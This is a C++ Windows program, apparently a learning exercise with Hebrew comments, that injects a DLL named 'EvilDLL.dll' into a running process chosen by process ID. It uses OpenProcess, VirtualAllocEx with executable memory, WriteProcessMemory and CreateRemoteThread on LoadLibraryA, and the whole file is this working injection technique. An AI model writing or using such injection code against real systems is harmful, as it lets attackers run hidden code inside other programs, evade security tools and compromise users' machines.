#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "EvilDLL.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
    HANDLE process_handle; // לינק אל הפרוסס שעליו מחדירים את הקובץ
    HANDLE rt; // remote thread
    LPVOID allocated_buffer; // המקום המוקצה שפנוי בפרוסס שעליו מחדירים
    bool dll_injected;
    if (argc < 2)
    {
        std::cout << "please enter a Process ID";
        return -1;
    }
    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
    if (hKernel32 == NULL) 
    {
        std::cout << "hKernal32 is null";
    }
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
    if (lb == NULL)
    {
        std::cout << "lb is null";
    }

    if (atoi(argv[1]) == 0) {
        std::cout << "Process ID not found \n";
        return -1;
    }
    std::cout << "Process ID: " << atoi(argv[1]) << "\n";
    process_handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE| PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, DWORD(atoi(argv[1])));
    std::cout << DWORD(atoi(argv[1])) << "\n";
    if (process_handle == NULL)
    {
        std::cout << "process_handle is null\n";
    }
    std::cout << process_handle << "\n";
    allocated_buffer = VirtualAllocEx(process_handle, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (allocated_buffer == NULL)
    {
        std::cout << "allocated_buffer is null\n";
    }
    dll_injected = WriteProcessMemory(process_handle, allocated_buffer, evilDLL, evilLen, NULL);
    if(!dll_injected)
    {
        std::cout << "did not inject\n";
    }
    rt = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, allocated_buffer, 0, NULL);
    std::cout << rt;
    CloseHandle(rt);
    CloseHandle(process_handle);
    return 0;
}
